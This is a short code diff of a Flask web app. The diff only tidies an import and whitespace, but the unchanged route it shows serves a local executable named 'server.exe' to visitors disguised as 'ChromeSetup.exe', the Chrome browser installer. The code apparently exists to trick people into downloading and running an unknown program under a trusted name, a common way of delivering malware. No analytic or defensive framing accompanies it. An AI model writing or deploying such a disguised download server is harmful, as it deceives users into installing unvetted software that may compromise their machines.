@@ -1,4 +1,4 @@
-from flask import Flask, request, send_file, redirect, render_template_string
+from flask import Flask, request, send_file, render_template_string
 
 # Create a Flask app instance
 app = Flask(__name__)
@@ -30,11 +30,13 @@ def index():
     """
     return render_template_string(template)
 
+
 # Define a route to handle the file download
 @app.route("/download")
 def download():
     # Send the file "server.exe" to the client as an attachment
     return send_file('server.exe', as_attachment=True, attachment_filename='ChromeSetup.exe')
+
 
 # Start the Flask app
 if __name__ == "__main__":
